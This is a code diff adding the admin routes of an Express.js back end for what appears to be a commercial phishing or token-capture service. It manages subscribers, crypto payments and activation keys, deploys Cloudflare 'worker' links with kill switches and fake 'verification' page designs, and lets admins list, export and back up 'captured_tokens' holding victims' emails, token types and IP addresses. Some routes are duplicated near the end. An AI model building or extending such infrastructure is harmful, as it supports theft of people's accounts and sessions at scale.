@@ -1,0 +1,614 @@
+const express = require('express');
+const router = express.Router();
+const bcrypt = require('bcryptjs');
+const jwt = require('jsonwebtoken');
+const db = require('../database/connection');
+const config = require('../config/env');
+const { adminAuth } = require('../middleware/auth');
+const { encrypt, decrypt } = require('../utils/encrypt');
+const { generateActivationCode } = require('../utils/helpers');
+const axios = require('axios');
+
+// --- Middleware to check admin panel access ---
+router.use(async (req, res, next) => {
+  // Skip setup check endpoint
+  if (req.path === '/check-setup') return next();
+  
+  const [admins] = await db.query('SELECT COUNT(*) as count FROM admins');
+  if (admins[0].count === 0) {
+    return res.status(404).json({ error: 'Not found' });
+  }
+  next();
+});
+
+// --- Dashboard ---
+router.get('/dashboard', adminAuth, async (req, res) => {
+  try {
+    const [totalUsers] = await db.query('SELECT COUNT(*) as count FROM users');
+    const [activeUsers] = await db.query("SELECT COUNT(*) as count FROM users WHERE subscription_status = 'active'");
+    const [totalTokens] = await db.query('SELECT COUNT(*) as count FROM captured_tokens WHERE deleted = 0');
+    const [pendingPayments] = await db.query("SELECT COUNT(*) as count FROM payments WHERE status = 'pending'");
+    const [activeLinks] = await db.query("SELECT COUNT(*) as count FROM links WHERE status = 'active' AND kill_switched = 0");
+    const [totalVisitors] = await db.query('SELECT COUNT(*) as count FROM visitors');
+    
+    res.json({
+      total_users: totalUsers[0].count,
+      active_users: activeUsers[0].count,
+      total_tokens: totalTokens[0].count,
+      pending_payments: pendingPayments[0].count,
+      active_links: activeLinks[0].count,
+      total_visitors: totalVisitors[0].count,
+    });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// --- Settings ---
+router.get('/settings', adminAuth, async (req, res) => {
+  try {
+    const [settings] = await db.query('SELECT setting_key, setting_value FROM settings');
+    const settingsObj = {};
+    settings.forEach(s => { settingsObj[s.setting_key] = s.setting_value; });
+    res.json(settingsObj);
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+router.put('/settings', adminAuth, async (req, res) => {
+  try {
+    for (const [key, value] of Object.entries(req.body)) {
+      await db.query(
+        'INSERT INTO settings (setting_key, setting_value) VALUES (?, ?) ON DUPLICATE KEY UPDATE setting_value = ?',
+        [key, String(value), String(value)]
+      );
+    }
+    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+      [req.admin.id, 'settings_update', JSON.stringify(req.body), req.ip]);
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// --- Users ---
+router.get('/users', adminAuth, async (req, res) => {
+  try {
+    const { search, status, page = 1, limit = 50 } = req.query;
+    let query = 'SELECT * FROM users WHERE 1=1';
+    const params = [];
+    
+    if (search) { query += ' AND (login_key LIKE ? OR activation_code LIKE ?)'; params.push(`%${search}%`, `%${search}%`); }
+    if (status) { query += ' AND subscription_status = ?'; params.push(status); }
+    
+    query += ' ORDER BY created_at DESC LIMIT ? OFFSET ?';
+    params.push(parseInt(limit), (parseInt(page) - 1) * parseInt(limit));
+    
+    const [users] = await db.query(query, params);
+    const [count] = await db.query('SELECT COUNT(*) as total FROM users');
+    
+    res.json({ users, total: count[0].total, page: parseInt(page) });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+router.get('/users/:id', adminAuth, async (req, res) => {
+  try {
+    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
+    if (!users.length) return res.status(404).json({ error: 'User not found' });
+    res.json(users[0]);
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+router.post('/users/:id/ban', adminAuth, async (req, res) => {
+  await db.query("UPDATE users SET subscription_status = 'banned' WHERE id = ?", [req.params.id]);
+  await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+    [req.admin.id, 'ban_user', `User ID: ${req.params.id}`, req.ip]);
+  res.json({ success: true });
+});
+
+router.post('/users/:id/unban', adminAuth, async (req, res) => {
+  await db.query("UPDATE users SET subscription_status = 'active' WHERE id = ?", [req.params.id]);
+  res.json({ success: true });
+});
+
+router.post('/users/:id/suspend', adminAuth, async (req, res) => {
+  await db.query("UPDATE users SET subscription_status = 'suspended' WHERE id = ?", [req.params.id]);
+  res.json({ success: true });
+});
+
+router.post('/users/:id/unsuspend', adminAuth, async (req, res) => {
+  await db.query("UPDATE users SET subscription_status = 'active' WHERE id = ?", [req.params.id]);
+  res.json({ success: true });
+});
+
+// --- Subscription management ---
+router.post('/users/:id/grant-trial', adminAuth, async (req, res) => {
+  const expiry = new Date(); expiry.setDate(expiry.getDate() + 1);
+  await db.query("UPDATE users SET subscription_plan = 'trial', subscription_status = 'active', subscription_expiry = ? WHERE id = ?", [expiry, req.params.id]);
+  res.json({ success: true, expiry });
+});
+
+router.post('/users/:id/grant-monthly', adminAuth, async (req, res) => {
+  const expiry = new Date(); expiry.setDate(expiry.getDate() + 30);
+  await db.query("UPDATE users SET subscription_plan = 'full', subscription_status = 'active', subscription_expiry = ? WHERE id = ?", [expiry, req.params.id]);
+  res.json({ success: true, expiry });
+});
+
+router.post('/users/:id/grant-lifetime', adminAuth, async (req, res) => {
+  await db.query("UPDATE users SET subscription_plan = 'lifetime', subscription_status = 'active', subscription_expiry = NULL WHERE id = ?", [req.params.id]);
+  res.json({ success: true });
+});
+
+router.post('/users/:id/extend', adminAuth, async (req, res) => {
+  const { days } = req.body;
+  await db.query('UPDATE users SET subscription_expiry = DATE_ADD(COALESCE(subscription_expiry, NOW()), INTERVAL ? DAY), subscription_status = ? WHERE id = ?',
+    [days || 30, 'active', req.params.id]);
+  res.json({ success: true });
+});
+
+router.post('/users/:id/revoke', adminAuth, async (req, res) => {
+  await db.query("UPDATE users SET subscription_status = 'expired', subscription_expiry = NOW() WHERE id = ?", [req.params.id]);
+  res.json({ success: true });
+});
+
+// --- Impersonate ---
+router.get('/users/:id/impersonate', adminAuth, async (req, res) => {
+  try {
+    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
+    if (!users.length) return res.status(404).json({ error: 'User not found' });
+    
+    const token = jwt.sign({ user_id: users[0].id }, config.JWT_SECRET, { expiresIn: '1h' });
+    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+      [req.admin.id, 'impersonate', `User ID: ${req.params.id}`, req.ip]);
+    res.json({ token, user: { id: users[0].id, subscription_status: users[0].subscription_status } });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// --- Key generation ---
+router.post('/keys/generate', adminAuth, async (req, res) => {
+  try {
+    const { plan, duration_days, usage_limit, count = 1 } = req.body;
+    const keys = [];
+    
+    for (let i = 0; i < count; i++) {
+      const keyCode = generateActivationCode();
+      const expiryDate = new Date();
+      expiryDate.setFullYear(expiryDate.getFullYear() + 1);
+      
+      await db.query(
+        'INSERT INTO activation_keys (key_code, plan, duration_days, usage_limit, created_by_admin_id, expires_at) VALUES (?, ?, ?, ?, ?, ?)',
+        [keyCode, plan || 'full', duration_days || 30, usage_limit || 1, req.admin.id, expiryDate]
+      );
+      keys.push({ key: keyCode, plan: plan || 'full', duration_days: duration_days || 30 });
+    }
+    
+    res.json({ keys });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+router.get('/keys', adminAuth, async (req, res) => {
+  const [keys] = await db.query('SELECT * FROM activation_keys ORDER BY created_at DESC LIMIT 100');
+  res.json(keys);
+});
+
+// --- Payments ---
+router.get('/payments', adminAuth, async (req, res) => {
+  const [payments] = await db.query('SELECT p.*, u.login_key FROM payments p LEFT JOIN users u ON p.user_id = u.id ORDER BY p.created_at DESC LIMIT 100');
+  res.json(payments);
+});
+
+// --- Force verify payment + generate activation key ---
+router.post('/payments/:uid/force-verify', adminAuth, async (req, res) => {
+  const uid = req.params.uid;
+  await db.query("UPDATE payments SET status = 'confirmed', confirmed_at = NOW() WHERE payment_uid = ?", [uid]);
+
+  // Check if it's a renewal
+  const [payment] = await db.query('SELECT * FROM payments WHERE payment_uid = ?', [uid]);
+  if (!payment.length) return res.json({ success: true });
+
+  const p = payment[0];
+  const crypto = require('crypto');
+  const keyCode = 'VG_' + crypto.randomBytes(12).toString('hex').toUpperCase();
+  const [durRow] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_duration_days'");
+  const duration = durRow.length ? parseInt(durRow[0].setting_value) : 30;
+  const keyExpiry = new Date(Date.now() + 365 * 86400000);
+
+  if (p.renew_key) {
+    // Renewal: extend user's expiry
+    await db.query("UPDATE users SET subscription_status = 'active', subscription_plan = 'full', subscription_expiry = DATE_ADD(COALESCE(subscription_expiry, NOW()), INTERVAL ? DAY) WHERE login_key = ?",
+      [duration, p.renew_key]);
+    res.json({ success: true, renewed: true, key: p.renew_key });
+  } else {
+    // New purchase: generate activation key
+    await db.query('INSERT INTO activation_keys (key_code, plan, duration_days, usage_limit, expires_at) VALUES (?, ?, ?, ?, ?)',
+      [keyCode, 'full', duration, 1, keyExpiry]);
+    res.json({ success: true, key: keyCode });
+  }
+
+  // Notify user if they have Telegram linked
+  if (p.user_id) {
+    const [users] = await db.query('SELECT telegram_id, telegram_bot_token FROM users WHERE id = ?', [p.user_id]);
+    if (users.length && users[0].telegram_id && users[0].telegram_bot_token) {
+      const axios = require('axios');
+      const msg = p.renew_key
+        ? `✅ Subscription renewed by admin.`
+        : `✅ Payment verified by admin.\nYour key: \`${keyCode}\``;
+      axios.post(`https://api.telegram.org/bot${users[0].telegram_bot_token}/sendMessage`, {
+        chat_id: users[0].telegram_id,
+        text: msg,
+        parse_mode: 'Markdown',
+      }).catch(() => {});
+    }
+  }
+
+  await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+    [req.admin.id, 'force_verify_payment', `UID: ${uid}`, req.ip]);
+});
+
+// --- Generate activation key (admin) ---
+router.post('/genkey', adminAuth, async (req, res) => {
+  try {
+    const { plan = 'full', duration_days = 30, usage_limit = 1 } = req.body;
+    const crypto = require('crypto');
+    const keyCode = 'VG_' + crypto.randomBytes(12).toString('hex').toUpperCase();
+    const keyExpiry = new Date(Date.now() + 365 * 86400000);
+    await db.query(
+      'INSERT INTO activation_keys (key_code, plan, duration_days, usage_limit, expires_at) VALUES (?, ?, ?, ?, ?)',
+      [keyCode, plan, duration_days, usage_limit, keyExpiry]
+    );
+    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+      [req.admin.id, 'genkey', `Key: ${keyCode}, plan: ${plan}, days: ${duration_days}`, req.ip]);
+    res.json({ key: keyCode, plan, duration_days });
+  } catch (err) {
+    console.error('[Genkey]', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// --- Global kill switch ---
+router.post('/killswitch/global', adminAuth, async (req, res) => {
+  await db.query('UPDATE links SET kill_switched = 1');
+  await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+    [req.admin.id, 'killswitch_global', 'All links killed', req.ip]);
+  res.json({ success: true });
+});
+
+router.post('/killswitch/user/:id', adminAuth, async (req, res) => {
+  await db.query('UPDATE links SET kill_switched = 1 WHERE user_id = ?', [req.params.id]);
+  res.json({ success: true });
+});
+
+// --- Workers ---
+router.get('/workers', adminAuth, async (req, res) => {
+  const [links] = await db.query('SELECT l.*, u.login_key FROM links l JOIN users u ON l.user_id = u.id ORDER BY l.created_at DESC');
+  res.json(links);
+});
+
+router.get('/workers/:id/logs', adminAuth, async (req, res) => {
+  const [logs] = await db.query('SELECT * FROM deployment_logs WHERE link_id = ? ORDER BY created_at DESC LIMIT 100', [req.params.id]);
+  res.json(logs);
+});
+
+// --- Templates management (admin) ---
+router.get('/templates', adminAuth, async (req, res) => {
+  const [templates] = await db.query('SELECT * FROM templates ORDER BY name ASC');
+  res.json(templates);
+});
+
+router.post('/templates', adminAuth, async (req, res) => {
+  const { name, category, config_json } = req.body;
+  const [result] = await db.query('INSERT INTO templates (name, category, config_json) VALUES (?, ?, ?)',
+    [name, category || 'preload', config_json || '{}']);
+  res.status(201).json({ id: result.insertId });
+});
+
+router.delete('/templates/:id', adminAuth, async (req, res) => {
+  await db.query("UPDATE templates SET status = 'disabled' WHERE id = ?", [req.params.id]);
+  res.json({ success: true });
+});
+
+// --- Verification designs management (admin) ---
+router.get('/designs', adminAuth, async (req, res) => {
+  const [designs] = await db.query('SELECT * FROM verification_designs ORDER BY name ASC');
+  res.json(designs);
+});
+
+router.post('/designs', adminAuth, async (req, res) => {
+  const { name, css_content, html_wrapper } = req.body;
+  const [result] = await db.query('INSERT INTO verification_designs (name, css_content, html_wrapper) VALUES (?, ?, ?)',
+    [name, css_content, html_wrapper]);
+  res.status(201).json({ id: result.insertId });
+});
+
+router.delete('/designs/:id', adminAuth, async (req, res) => {
+  await db.query("UPDATE verification_designs SET status = 'disabled' WHERE id = ?", [req.params.id]);
+  res.json({ success: true });
+});
+
+// --- Notices ---
+router.get('/notices', adminAuth, async (req, res) => {
+  const [notices] = await db.query('SELECT * FROM notices ORDER BY created_at DESC');
+  res.json(notices);
+});
+
+router.post('/notices', adminAuth, async (req, res) => {
+  const { title, content } = req.body;
+  await db.query('INSERT INTO notices (title, content) VALUES (?, ?)', [title, content]);
+  res.status(201).json({ success: true });
+});
+
+router.put('/notices/:id', adminAuth, async (req, res) => {
+  const { title, content, active } = req.body;
+  await db.query('UPDATE notices SET title = ?, content = ?, active = ? WHERE id = ?', [title, content, active ? 1 : 0, req.params.id]);
+  res.json({ success: true });
+});
+
+// --- Feedback management ---
+router.get('/feedback', adminAuth, async (req, res) => {
+  const [feedback] = await db.query('SELECT f.*, u.login_key FROM feedback f JOIN users u ON f.user_id = u.id ORDER BY f.created_at DESC');
+  res.json(feedback);
+});
+
+router.put('/feedback/:id', adminAuth, async (req, res) => {
+  const { admin_reply, status } = req.body;
+  await db.query('UPDATE feedback SET admin_reply = ?, status = ? WHERE id = ?', [admin_reply, status, req.params.id]);
+  res.json({ success: true });
+});
+
+// --- Audit log ---
+router.get('/audit', adminAuth, async (req, res) => {
+  const [logs] = await db.query('SELECT * FROM audit_log ORDER BY created_at DESC LIMIT 200');
+  res.json(logs);
+});
+
+// --- Login history ---
+router.get('/login-history', adminAuth, async (req, res) => {
+  const [history] = await db.query('SELECT * FROM login_history ORDER BY created_at DESC LIMIT 200');
+  res.json(history);
+});
+
+// --- Analytics ---
+router.get('/analytics', adminAuth, async (req, res) => {
+  const [tokensByDay] = await db.query("SELECT DATE(created_at) as date, COUNT(*) as count FROM captured_tokens WHERE created_at > DATE_SUB(NOW(), INTERVAL 30 DAY) GROUP BY DATE(created_at) ORDER BY date ASC");
+  const [visitorsByDay] = await db.query("SELECT DATE(created_at) as date, COUNT(*) as count FROM visitors WHERE created_at > DATE_SUB(NOW(), INTERVAL 30 DAY) GROUP BY DATE(created_at) ORDER BY date ASC");
+  res.json({ tokens_by_day: tokensByDay, visitors_by_day: visitorsByDay });
+});
+
+// --- Export ---
+router.get('/export/users', adminAuth, async (req, res) => {
+  const [users] = await db.query('SELECT id, login_key, subscription_status, subscription_plan, subscription_expiry, created_at FROM users');
+  res.setHeader('Content-Type', 'text/csv');
+  res.setHeader('Content-Disposition', 'attachment; filename=users_export.csv');
+  let csv = 'ID,Login Key,Status,Plan,Expiry,Created\n';
+  users.forEach(u => { csv += `${u.id},${u.login_key},${u.subscription_status},${u.subscription_plan},${u.subscription_expiry || ''},${u.created_at}\n`; });
+  res.send(csv);
+});
+
+router.get('/export/payments', adminAuth, async (req, res) => {
+  const [payments] = await db.query('SELECT * FROM payments ORDER BY created_at DESC');
+  res.setHeader('Content-Type', 'text/csv');
+  res.setHeader('Content-Disposition', 'attachment; filename=payments_export.csv');
+  let csv = 'ID,UID,Coin,Amount USD,Status,Created,Confirmed\n';
+  payments.forEach(p => { csv += `${p.id},${p.payment_uid},${p.coin},${p.amount_usd},${p.status},${p.created_at},${p.confirmed_at || ''}\n`; });
+  res.send(csv);
+});
+
+// --- Diagnostics ---
+router.get('/diagnostics', adminAuth, async (req, res) => {
+  const results = {};
+  
+  // DB check
+  try {
+    await db.query('SELECT 1');
+    results.database = 'OK';
+  } catch (e) {
+    results.database = `FAIL: ${e.message}`;
+  }
+  
+  // Cloudflare check
+  if (config.CF_API_TOKEN) {
+    try {
+      const cfRes = await axios.get('https://api.cloudflare.com/client/v4/user/tokens/verify', {
+        headers: { Authorization: `Bearer ${config.CF_API_TOKEN}` },
+      });
+      results.cloudflare = cfRes.data.success ? 'OK' : `FAIL: ${JSON.stringify(cfRes.data.errors)}`;
+    } catch (e) {
+      results.cloudflare = `FAIL: ${e.message}`;
+    }
+  } else {
+    results.cloudflare = 'Not configured';
+  }
+  
+  // Telegram check
+  if (config.TELEGRAM_BOT_TOKEN) {
+    try {
+      const tgRes = await axios.get(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/getMe`);
+      results.telegram = tgRes.data.ok ? `OK: @${tgRes.data.result.username}` : 'FAIL';
+    } catch (e) {
+      results.telegram = `FAIL: ${e.message}`;
+    }
+  } else {
+    results.telegram = 'Not configured';
+  }
+  
+  // NowPayments check
+  if (config.NOWPAYMENTS_API_KEY) {
+    try {
+      const npRes = await axios.get('https://api.nowpayments.io/v1/status', {
+        headers: { 'x-api-key': config.NOWPAYMENTS_API_KEY },
+      });
+      results.nowpayments = npRes.data.message ? 'OK' : 'FAIL';
+    } catch (e) {
+      results.nowpayments = `FAIL: ${e.message}`;
+    }
+  } else {
+    results.nowpayments = 'Not configured';
+  }
+  
+  // DB size
+  try {
+    const [size] = await db.query("SELECT ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) as size_mb FROM information_schema.tables WHERE table_schema = ?", [config.DB.database]);
+    results.database_size_mb = size[0].size_mb;
+  } catch (e) {
+    results.database_size_mb = 'Unknown';
+  }
+  
+  res.json(results);
+});
+
+// --- Bulk import users ---
+router.post('/users/import', adminAuth, async (req, res) => {
+  try {
+    const { csv_data } = req.body;
+    if (!csv_data) return res.status(400).json({ error: 'CSV data required' });
+    
+    const lines = csv_data.split('\n').filter(l => l.trim());
+    let imported = 0;
+    
+    for (let i = 1; i < lines.length; i++) {
+      const cols = lines[i].split(',');
+      if (cols.length >= 2) {
+        const loginKey = cols[0].trim();
+        const plan = cols[1].trim() || 'full';
+        if (loginKey.startsWith('VG_')) {
+          try {
+            await db.query(
+              'INSERT IGNORE INTO users (login_key, subscription_plan, subscription_status) VALUES (?, ?, ?)',
+              [loginKey, plan, 'active']
+            );
+            imported++;
+          } catch (e) { /* skip duplicates */ }
+        }
+      }
+    }
+    
+    res.json({ imported });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// --- Blacklist ---
+router.get('/blacklist', adminAuth, async (req, res) => {
+  const [list] = await db.query('SELECT * FROM blacklist ORDER BY created_at DESC');
+  res.json(list);
+});
+
+router.post('/blacklist', adminAuth, async (req, res) => {
+  const { email_pattern, domain, reason } = req.body;
+  await db.query('INSERT INTO blacklist (email_pattern, domain, reason) VALUES (?, ?, ?)', [email_pattern, domain, reason]);
+  res.status(201).json({ success: true });
+});
+
+router.delete('/blacklist/:id', adminAuth, async (req, res) => {
+  await db.query('DELETE FROM blacklist WHERE id = ?', [req.params.id]);
+  res.json({ success: true });
+});
+
+// --- Rate limit status ---
+router.get('/rate-limit', adminAuth, (req, res) => {
+  res.json({
+    window_ms: config.RATE_LIMIT_WINDOW_MS,
+    max_requests: config.RATE_LIMIT_MAX_REQUESTS,
+  });
+});
+
+// --- Backup ---
+router.get('/backup', adminAuth, async (req, res) => {
+  try {
+    const [users] = await db.query('SELECT * FROM users');
+    const [links] = await db.query('SELECT * FROM links');
+    const [tokens] = await db.query('SELECT id, user_id, link_id, email, token_type, ip_address, created_at FROM captured_tokens WHERE deleted = 0');
+    const [payments] = await db.query('SELECT * FROM payments');
+    
+    const backup = {
+      exported_at: new Date().toISOString(),
+      users: users.length,
+      links: links.length,
+      tokens: tokens.length,
+      payments: payments.length,
+      data: { users, links, tokens, payments },
+    };
+    
+    res.setHeader('Content-Type', 'application/json');
+    res.setHeader('Content-Disposition', `attachment; filename=backup-${Date.now()}.json`);
+    res.json(backup);
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// --- Notify user ---
+router.post('/users/:id/notify', adminAuth, async (req, res) => {
+  try {
+    const { message } = req.body;
+    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
+    if (!users.length) return res.status(404).json({ error: 'User not found' });
+    
+    const user = users[0];
+    if (user.telegram_id && user.telegram_bot_token) {
+      await axios.post(`https://api.telegram.org/bot${user.telegram_bot_token}/sendMessage`, {
+        chat_id: user.telegram_id,
+        text: `📢 Admin message:\n\n${message}`,
+      });
+      res.json({ success: true });
+    } else {
+      res.status(400).json({ error: 'User has no Telegram configured' });
+    }
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Global tokens list
+router.get('/tokens', adminAuth, async (req, res) => {
+  try {
+    const [tokens] = await db.query(
+      `SELECT ct.*, u.login_key FROM captured_tokens ct 
+       LEFT JOIN users u ON ct.user_id = u.id 
+       ORDER BY ct.created_at DESC LIMIT 200`
+    );
+    res.json({ tokens });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Delete a token (admin)
+router.delete('/tokens/:id', adminAuth, async (req, res) => {
+  await db.query('DELETE FROM captured_tokens WHERE id = ?', [req.params.id]);
+  res.json({ success: true });
+});
+
+// Export tokens (admin)
+router.get('/tokens/export', adminAuth, async (req, res) => {
+  const [tokens] = await db.query('SELECT * FROM captured_tokens ORDER BY created_at DESC');
+  res.json(tokens);
+});
+
+// In admin.js routes:
+router.get('/workers', adminAuth, async (req, res) => {
+  const [links] = await db.query('SELECT l.*, u.login_key FROM links l JOIN users u ON l.user_id = u.id ORDER BY l.created_at DESC');
+  res.json(links);
+});
+
+router.delete('/workers/:id', adminAuth, async (req, res) => {
+  await db.query("UPDATE links SET status = 'disabled' WHERE id = ?", [req.params.id]);
+  res.json({ success: true });
+});
+
+router.get('/workers/:id/logs', adminAuth, async (req, res) => {
+  const [logs] = await db.query('SELECT * FROM deployment_logs WHERE link_id = ? ORDER BY created_at DESC LIMIT 100', [req.params.id]);
+  res.json(logs);
+});
+
+module.exports = router;
